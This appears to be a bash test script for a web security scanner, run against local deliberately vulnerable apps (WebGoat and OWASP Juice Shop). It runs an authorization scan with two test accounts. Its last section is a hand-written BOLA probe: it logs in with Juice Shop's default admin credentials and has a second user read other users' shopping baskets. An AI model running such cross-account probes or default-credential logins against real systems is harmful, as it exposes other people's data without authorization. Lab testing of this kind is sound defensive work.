#!/usr/bin/env bash
# C13 + E live scenario: WebGoat authz with 2 REAL accounts + Juice Shop BOLA probe
R=/home/z/my-project/readiness; Z=$R/ziprun; EV=$R/evidence/live
> $EV/C13_probe.txt

# --- 1) ensure two working WebGoat accounts ---
for u in sentinel10y sentinel11z; do
  curl -s -o /dev/null -w "reg $u:%{http_code} " -X POST "http://127.0.0.1:8080/WebGoat/register.mvc" \
    --data-urlencode "username=$u" --data-urlencode "password=test1234" \
    --data-urlencode "matchingPassword=test1234" --data-urlencode "agree=true" >> $EV/C13_probe.txt 2>&1
  LOC=$(curl -s -o /dev/null -w "%{redirect_url}" -c /tmp/wg_$u.jar -X POST "http://127.0.0.1:8080/WebGoat/login" \
    --data-urlencode "username=$u" --data-urlencode "password=test1234")
  echo "login $u -> $LOC" >> $EV/C13_probe.txt
done
# find a success marker on the welcome page
curl -s -b /tmp/wg_sentinel10y.jar "http://127.0.0.1:8080/WebGoat/welcome.mvc" -o /tmp/wg_welcome.html
MARKER=$(python3 -c "
import re
h = open('/tmp/wg_welcome.html').read()
for cand in ['WebGoat', 'Welcome', 'Logout', 'Sign Out', 'logout']:
    if cand.lower() in h.lower():
        print(cand); break
else:
    print('WebGoat')")
echo "marker: $MARKER" >> $EV/C13_probe.txt

# --- 2) WebGoat authz accounts file (two REAL users) ---
cat > $EV/webgoat_accounts.json <<EOF
{
 "login_url": "http://127.0.0.1:8080/WebGoat/login",
 "user_field": "username",
 "pass_field": "password",
 "success_marker": "$MARKER",
 "login_marker": "login",
 "accounts": [
  {"name": "userA", "role": "user", "username": "sentinel10y", "password": "test1234", "marker": "sentinel10y", "object_id": "1"},
  {"name": "userB", "role": "user", "username": "sentinel11z", "password": "test1234", "marker": "sentinel11z", "object_id": "2"}
 ]
}
EOF

# --- 3) WebGoat scan WITH authz battery (User A / User B on a live app) ---
cd $Z
timeout 420 python3 sentinel/cli.py scan http://127.0.0.1:8080/WebGoat \
  --allow-private --max-pages 25 \
  --auth-user sentinel10y --auth-pass test1234 \
  --auth-url http://127.0.0.1:8080/WebGoat/login \
  --auth-user-field username --auth-pass-field password \
  --authz-accounts $EV/webgoat_accounts.json \
  --db $EV/live_v400.db --out $EV/C13_webgoat_authz.json > $EV/C13_webgoat_authz.stdout 2> $EV/C13_webgoat_authz.stderr
echo "webgoat authz exit=$?"

python3 -c "
import json
try:
    d=json.load(open('$EV/C13_webgoat_authz.json'))
    st=d.get('stats',{}); az=st.get('authz',{})
    print('run:',d.get('run_id'),'req:',st.get('requests'),'ep:',st.get('endpoints'),'verified:',st.get('verified'),'rejected:',st.get('rejected'))
    print('authz:', az if not isinstance(az,dict) else {k:az[k] for k in list(az)[:10]})
    from collections import Counter
    print('types:',dict(Counter(x.get('type') for x in d.get('findings',[]))))
except Exception as e: print('ERR:',e)" >> $EV/C13_probe.txt 2>&1

# --- 4) Juice Shop BOLA manual probe: register user B, login both, cross-basket read ---
JB=$(curl -s -X POST http://localhost:3000/api/Users -H "Content-Type: application/json" \
  -d '{"email":"sentinel-b@juice-sh.op","password":"Test1234!","passwordRepeat":"Test1234!","securityQuestion":{"id":1,"question":"?","answer":"a"},"securityAnswer":"a"}' --max-time 8)
echo "register B: $(echo $JB | head -c 100)" >> $EV/C13_probe.txt
TA=$(curl -s -X POST http://localhost:3000/rest/user/login -H "Content-Type: application/json" -d '{"email":"admin@juice-sh.op","password":"admin123"}' --max-time 8 | python3 -c "import json,sys;print(json.load(sys.stdin)['authentication']['token'])")
TB=$(curl -s -X POST http://localhost:3000/rest/user/login -H "Content-Type: application/json" -d '{"email":"sentinel-b@juice-sh.op","password":"Test1234!"}' --max-time 8 | python3 -c "import json,sys;print(json.load(sys.stdin)['authentication']['token'])")
echo "tokens: A=${#TA}c B=${#TB}c" >> $EV/C13_probe.txt
# B reads baskets 1..7 (which belong to other users)
for i in 1 2 3 4 5 6 7; do
  RESP=$(curl -s -w "|%{http_code}" -H "Authorization: Bearer $TB" "http://localhost:3000/rest/basket/$i" --max-time 8)
  CODE="${RESP##*|}"; BODY=$(echo "${RESP%|*}" | head -c 80)
  echo "B->basket/$i: $CODE $BODY" >> $EV/C13_probe.txt
done
# whoami both
echo "A whoami: $(curl -s -H "Authorization: Bearer $TA" http://localhost:3000/rest/user/whoami --max-time 8 | head -c 120)" >> $EV/C13_probe.txt
echo "B whoami: $(curl -s -H "Authorization: Bearer $TB" http://localhost:3000/rest/user/whoami --max-time 8 | head -c 120)" >> $EV/C13_probe.txt
cat $EV/C13_probe.txt
